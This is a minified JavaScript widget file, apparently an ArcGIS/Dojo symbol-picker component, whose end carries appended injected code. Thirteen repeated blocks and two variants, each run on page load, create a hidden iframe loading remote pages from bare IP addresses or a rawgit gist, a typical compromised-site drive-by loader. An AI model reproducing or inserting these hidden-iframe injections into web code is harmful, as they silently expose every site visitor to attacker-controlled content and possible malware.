a.uniqueValueInfos;else if("undefined"!==typeof a.classBreakInfos)b=a.classBreakInfos;else if(a.type&&"heatmap"===a.type&&a.colorStops){var a=a.colorStops,c=[];if(a&&1<=a.length){var g=a[0].color,g=z.fromArray([g.r,g.g,g.b]);c.push({symbol:new u(u.STYLE_CIRCLE,10,new v(v.STYLE_SOLID,g),g)});2<a.length&&(g=a[a.length-1].color,g=z.fromArray([g.r,g.g,g.b]),c.push({symbol:new u(u.STYLE_CIRCLE,10,new v(v.STYLE_SOLID,g),g)}))}this.infos=c;0<c.length?this.layerSym.appendChild(this._createCombinedImageDataDiv(c)):
(this._createImageDataDiv2(void 0,44,44,!0,!1),this._createImageDataDiv2(void 0,28,28,!1,!1))}else this.rdoEsriSym.set("checked",!0),this.symbolType="EsriSymbol",this.iconType="LayerIcon",this._initSymbolPicker(A.getTypeByGeometryType(this.geometryType)),this._setFields(this.fields),this._setSymbol(),this.symbolInfo.symbolType="LayerSymbol",this.symbolInfo.symbolOverride=!0;b&&(this.ren=b,this.layerSym.innerHTML="\x3cdiv\x3e\x3c/div\x3e",this.layerSym.appendChild(this._createCombinedImageDataDiv(b)),
d.setStyle(this.layerSym,"cursor","pointer"))}},_createImageDataDiv2:function(a,b,c,d,h){var e;if("string"===typeof a)e=q.create("div",{"class":"imageDataGFX",innerHTML:a}),d?this.panelHTML=e.innerHTML:this.svg=e;else if("undefined"===typeof a)e=q.create("div",{"class":"imageDataGFX"}),e.innerHTML="\x3cdiv\x3e\x3c/div\x3e",d?this.panelHTML=e.innerHTML:this.svg=e;else{var f=m.fromJson(a);f||(f=a);f?(a=c,c=b,f.height&&f.width&&(e=f.width/f.height,f.height>f.width?c=b*e:f.width>f.height&&(a=c/e)),"undefined"!==
typeof f.setWidth?"undefined"!==typeof f.setHeight?(f.setWidth(h?c-.25*c:c),f.setHeight(h?a-.25*a:a)):f.setWidth(2):"undefined"!==typeof f.size&&20<f.size&&f.setSize(20),e=q.create("div",{"class":"imageDataGFX"}),b=w.createSurface(e,c,a),f=m.getShapeDescriptors(f),b.createShape(f.defaultShape).setFill(f.fill).setStroke(f.stroke).applyTransform({dx:c/2,dy:a/2}),d?this.panelHTML=e.innerHTML:this.svg=e):"undefined"!==typeof a.url&&(e=q.create("div",{"class":"imageDataGFX"}),r.set(e,"background-image",
"url("+a.url+")"),r.set(e,"background-repeat","no-repeat"),d?this.panelHTML=e.innerHTML:this.svg=e)}return e},_createImageDataDiv:function(a,b,c){c=q.create("div",{"class":"imageDataGFX-display"},c);(b=b?m.fromJson(a):a)||(b=a);this.symbol=b;var d=a=26;b.height&&b.width&&b.height>b.width&&(d=b.width/b.height,a=26,d*=26);var h=w.createSurface(c,d,a);b=m.getShapeDescriptors(this.setSym(b,d,a));h.createShape(b.defaultShape).setFill(b.fill).setStroke(b.stroke).applyTransform({dx:d/2,dy:a/2});this.svg=
c.firstChild;return c},_createCombinedImageDataDiv:function(a){var b=q.create("div",{"class":"imageDataGFXMulti"},this.customSymbolPlaceholder);this.lyrSymbolSet=[];for(var c=this.symbolInfo&&this.symbolInfo.selectedId?!1:!0,g=0;g<a.length;g++){var h=a[g].symbol,e=m.fromJson(h);e||(e=h);"undefined"===typeof this.symbol&&(this.symbol=e);this.lyrSymbolSet.push(e);var f=h=26;e.height&&e.width&&e.height>e.width&&(f=e.width/e.height,h=26,f*=26);var n=q.create("div",{"class":"imageDataGFX imageDataGFX2",
id:"imageGFX_"+g,onclick:k.hitch(this,this.layerSymbolClick)},b),l=w.createSurface(n,f,h),e=m.getShapeDescriptors(this.setSym(e,f,h));l.createShape(e.defaultShape).setFill(e.fill).setStroke(e.stroke).applyTransform({dx:f/2,dy:h/2});b.insertBefore(n,b.firstChild);b.appendChild(n);if(c||this.symbolInfo&&n.id===this.symbolInfo.selectedId)this.setLayerSymbol(n),c=!1;l.rawNode&&(d.setStyle(l.rawNode,"display","block"),d.setStyle(l.rawNode,"margin","auto"))}return b},layerSymbolClick:function(a){this.setLayerSymbol(a.currentTarget)},
setLayerSymbol:function(a){for(var b,c=0;c<a.parentElement.children.length;c++){var g=a.parentElement.children[c];d.removeClass(g,"lyrSymbolSelected");g.id===a.id&&(b=c)}d.addClass(a,"lyrSymbolSelected");this.selectedID=a.id;this.svg=a;this.panelHTML=a.innerHTML;this.symbol=this.lyrSymbolSet[b]},setSym:function(a,b,c){"undefined"!==typeof a.setWidth?("esriGeometryPoint"===this.geometryType&&a.setWidth(b),"undefined"!==typeof a.setHeight&&a.setHeight(c)):("undefined"!==typeof a.size&&20<a.size&&a.setSize(20),
"undefined"!==typeof a.width&&(a.width=b),"undefined"!==typeof a.height&&(a.height=c));return a},uploadImage:function(a,b){var c="Symbol"===a?this.customSymbolPlaceholder:this.customIconPlaceholder;c.innerHTML="";c.innerHTML=q.create("div",{"class":"customPlaceholder",innerHTML:['\x3cimg class\x3d"customPlaceholder" src\x3d"',b,'"/\x3e'].join(""),title:"Symbol"===a?this.nls.editCustomSymbol:this.nls.editCustomIcon}).innerHTML},_chkGroupChanged:function(a){this.groupFeaturesEnabled=a;d.setStyle(this.groupByOptions,
"display",a?"inline-block":"none")},_rdoGroupByFieldChanged:function(a){this.groupByField=a;this.rdoGroupField.set("checked",a);d.setStyle(this.groupFieldOptions,"display",a?"inline-block":"none")},_rdoGroupByRendererChanged:function(a){this.groupByRenderer=a;this.rdoGroupRenderer.set("checked",a)},destroy:function(){this.symbolInfo=null;this.tabContainer.destroyRecursive()}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});